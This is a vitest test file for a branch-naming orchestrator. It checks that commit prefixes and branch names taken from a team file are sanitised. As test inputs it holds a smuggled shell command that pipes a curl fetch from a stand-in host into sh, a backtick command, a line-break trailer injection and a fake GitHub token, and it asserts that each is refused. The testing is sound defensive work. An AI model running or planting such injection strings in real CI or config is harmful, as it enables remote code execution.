import { mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { MiddlewareHandler } from "hono";
import { afterEach, describe, expect, it } from "vitest";
import { seed } from "../demo/seed.js";
import { ORCHESTRATOR_BRANCH_PREFIX, proposedBranch, recordedCommitPrefix, teamNaming, TICKET_PLACEHOLDER } from "./branches.js";
import { createApp, mirrorDir, syncRepo } from "./app.js";
import type { OrchestratorContext } from "./app.js";
import type { OrchestratorEnv, Principal } from "./auth.js";
import { ChangeRefused, prepareChange } from "./changes.js";
import { localDescriptionRef, localRepoPath } from "./forge/local.js";
import { git, gitMaybe } from "./git.js";
import { readTeamRecordAsync } from "./inventory.js";
import { reconcileLocalRequests } from "./propose.js";
import { openSqliteStore } from "./store.js";

const dirs: string[] = [];
afterEach(() => {
  for (const dir of dirs.splice(0)) rmSync(dir, { recursive: true, force: true });
});

const OWNER: Principal = { id: "p", name: "Pat Example", email: "pat@example.invalid", role: "member", ownedTeams: ["Payments"] };
const SKILL = "---\nname: on-call\ndescription: Use at shift change to hand over the pager.\n---\n\n1. Write the handover.\n";
const ON_CALL = { kind: "skill.add", slug: "on-call", content: SKILL };

function as(user: Principal): MiddlewareHandler<OrchestratorEnv> {
  return async (c, next) => {
    c.set("user", user);
    await next();
  };
}

/** The seeded Payments repository with `naming` written into its team file on main. */
async function payments(naming: Record<string, string>): Promise<{ ctx: OrchestratorContext; bare: string; root: string }> {
  const root = mkdtempSync(join(tmpdir(), "orchestrator-branches-"));
  dirs.push(root);
  const { configFile } = seed(join(root, "demo"));
  const config = JSON.parse(readFileSync(configFile, "utf8"));
  const ctx: OrchestratorContext = { store: openSqliteStore(":memory:"), dataDir: join(root, "data"), tenant: config.tenant };
  const entry = config.repos.find((r: { id: string }) => r.id === "payments-skills");
  await ctx.store.upsertRepo({ ...entry, tenant: config.tenant });
  const bare = localRepoPath(entry.url)!;
  const work = mkdtempSync(join(root, "work-"));
  git(["clone", "--quiet", bare, work], work);
  const file = join(work, ".teamhandbook.json");
  writeFileSync(file, JSON.stringify({ ...JSON.parse(readFileSync(file, "utf8")), ...naming }, null, 2) + "\n");
  git(["-c", "user.name=t", "-c", "user.email=t@example.invalid", "commit", "--allow-empty", "-qam", "chore: naming"], work);
  git(["fetch", "--quiet", work, "main:main"], bare);
  await syncRepo(ctx, "payments-skills");
  return { ctx, bare, root };
}

function send(app: ReturnType<typeof createApp>, path: string, body: unknown) {
  return app.request(path, { method: "POST", body: JSON.stringify(body), headers: { "content-type": "application/json", "x-csrf-token": "t" } });
}

describe("the branch an orchestrator request goes on", () => {
  it.each([
    ["no naming", {}, new RegExp(`^${ORCHESTRATOR_BRANCH_PREFIX}skill-on-call-[0-9a-f]{6}$`)],
    ["a commit prefix that is a ticket key", { commitPrefix: "PAY-12" }, /^PAY-12-skill-on-call-[0-9a-f]{6}$/],
    ["a commit prefix that is not a ticket key", { commitPrefix: "PAY" }, new RegExp(`^${ORCHESTRATOR_BRANCH_PREFIX}skill-on-call-[0-9a-f]{6}$`)],
    ["an example branch with a folder", { branchExample: "team/fix-login" }, /^team\/skill-on-call-[0-9a-f]{6}$/],
    ["an example branch that starts with a ticket", { branchExample: "TEAM-42-fix-login" }, /^<TICKET>-skill-on-call-[0-9a-f]{6}$/],
  ])("given %s, when a branch is proposed, then it is named the way the plugin's share would name it", (_label, naming, shape) => {
    expect(proposedBranch("skill-on-call", naming)).toMatch(shape);
  });

  it("given an example branch that carries a credential, when the team's naming is read, then the example is left out", async () => {
    // given
    const { ctx } = await payments({ branchExample: "feature/ghp_abcdefghijklmnopqrstuvwxyz0123456789" });
    const head = (await ctx.store.getRepo(ctx.tenant, "payments-skills"))!.head!;

    // when
    const naming = await teamNaming(mirrorDir(ctx, "payments-skills"), head);

    // then
    expect(naming.branchExample).toBeUndefined();
  });

  it("given a team file whose prefix would run a command in the CI job, when the team's naming, its record and the proposal are read, then the prefix is used nowhere and the setup panel says why", async () => {
    // given
    const { ctx } = await payments({ commitPrefix: 'VAN-7 $(curl -s evil.example.invalid|sh)" && echo "' });
    const repo = (await ctx.store.getRepo(ctx.tenant, "payments-skills"))!;
    const app = createApp(ctx, as(OWNER));

    // when
    const naming = await teamNaming(mirrorDir(ctx, repo.id), repo.head!);
    const record = await readTeamRecordAsync(mirrorDir(ctx, repo.id), repo.head!);
    const { proposal } = await (await send(app, "/api/repos/payments-skills/changes/proposal", { change: ON_CALL })).json();
    const { inventory } = await (await app.request("/api/repos/payments-skills/inventory")).json();

    // then
    expect(naming.commitPrefix).toBeUndefined();
    expect(record).not.toHaveProperty("commitPrefix");
    expect(record?.commitPrefixProblem).toBe("carrying a character other than letters, digits, spaces and . , : / [ ] ( ) _ -");
    expect(proposal).toBe("feat(skill): add on-call");
    expect(inventory.setup).toContainEqual(expect.objectContaining({ level: "problem", title: "The commit prefix is not used" }));
    expect(JSON.stringify(inventory)).not.toContain("curl");
  });

  it.each([
    ["a prefix with spaces around it", "  PAY-12 ", { prefix: "PAY-12" }],
    ["a prefix with a line break", "PAY\n\nCo-authored-by: someone", { problem: "carrying a control character" }],
    ["a prefix with a backtick", "PAY`id`", { problem: "carrying a character other than letters, digits, spaces and . , : / [ ] ( ) _ -" }],
    ["no prefix", undefined, {}],
  ])("given %s in the team file, when it is read, then it is read as the plugin's join reads it", (_label, value, read) => {
    expect(recordedCommitPrefix(value)).toEqual(read);
  });

  it("given a team whose example is team/fix-login, when a change is reviewed and opened as proposed, then its branch takes the team's shape", async () => {
    // given
    const { ctx, bare } = await payments({ branchExample: "team/fix-login" });
    const app = createApp(ctx, as(OWNER));
    const head = (await ctx.store.getRepo(ctx.tenant, "payments-skills"))!.head!;

    // when
    const { proposal, branch } = await (await send(app, "/api/repos/payments-skills/changes/proposal", { change: ON_CALL })).json();
    const res = await send(app, "/api/repos/payments-skills/changes", { baseSha: head, change: ON_CALL, message: proposal, branch });
    const { request } = await res.json();

    // then
    expect(branch).toMatch(/^team\/skill-on-call-[0-9a-f]{6}$/);
    expect(request.branch).toBe(branch);
    expect(gitMaybe(["rev-parse", "--verify", "--quiet", `refs/heads/${branch}`], bare)).not.toBeNull();
  });

  it("given a team whose branches start with a ticket, when a change is opened without naming one and then with one, then the first is refused and the second goes on the branch the person named", async () => {
    // given
    const { ctx } = await payments({ branchExample: "TEAM-42-fix-login" });
    const repo = (await ctx.store.getRepo(ctx.tenant, "payments-skills"))!;
    const mirror = mirrorDir(ctx, repo.id);
    const naming = await teamNaming(mirror, repo.head!);

    // when
    const unnamed = await prepareChange(mirror, repo.head!, ON_CALL, "feat(skill): add on-call", "Pat", naming).catch((err: Error) => err);
    const left = await prepareChange(mirror, repo.head!, ON_CALL, "feat(skill): add on-call", "Pat", naming, `${TICKET_PLACEHOLDER}-skill-on-call`).catch((err: Error) => err);
    const named = await prepareChange(mirror, repo.head!, ON_CALL, "feat(skill): add on-call", "Pat", naming, "TEAM-77-skill-on-call");

    // then
    expect(unnamed).toBeInstanceOf(ChangeRefused);
    expect((unnamed as Error).message).toContain(`this team names branches like TEAM-42-fix-login; name the ticket in the branch, in place of ${TICKET_PLACEHOLDER} in `);
    expect(left).toBeInstanceOf(ChangeRefused);
    expect((left as Error).message).toBe(`put the ticket in place of ${TICKET_PLACEHOLDER} in the branch name`);
    expect(named.branch).toBe("TEAM-77-skill-on-call");
  });

  it.each([
    ["a credential", "feature/ghp_abcdefghijklmnopqrstuvwxyz0123456789", "that branch name cannot be used"],
    ["a name git refuses", "team/..lock", "git does not accept that as a branch name"],
  ])("given a branch name carrying %s, when a change is prepared on it, then it is refused", async (_label, branch, message) => {
    // given
    const { ctx } = await payments({});
    const repo = (await ctx.store.getRepo(ctx.tenant, "payments-skills"))!;

    // when
    const attempt = prepareChange(mirrorDir(ctx, repo.id), repo.head!, ON_CALL, "feat(skill): add on-call", "Pat", {}, branch);

    // then
    await expect(attempt).rejects.toThrow(message);
  });

  it("given a branch the orchestrator made under the team's naming that no request names, and a teammate's branch of the same shape, when the orchestrator starts, then only the orchestrator's is moved aside", async () => {
    // given
    const { ctx, bare } = await payments({ branchExample: "team/fix-login" });
    const head = git(["rev-parse", "main"], bare).trim();
    // Committed the way the orchestrator commits: git here names the orchestrator as the committer.
    const left = git(["commit-tree", `${head}^{tree}`, "-p", head, "-m", "left by a stop"], bare).trim();
    git(["update-ref", "refs/heads/team/skill-orphan-abc123", left], bare);
    git(["notes", "--ref", localDescriptionRef("team/skill-orphan-abc123"), "add", "-m", "description", left], bare);
    git(["update-ref", "refs/heads/team/teammate-feature", left], bare);

    // when
    await reconcileLocalRequests(ctx);

    // then
    expect(gitMaybe(["rev-parse", "--verify", "--quiet", "refs/heads/team/skill-orphan-abc123"], bare)).toBeNull();
    expect(gitMaybe(["rev-parse", "--verify", "--quiet", "refs/heads/team/teammate-feature"], bare)).not.toBeNull();
  });
});
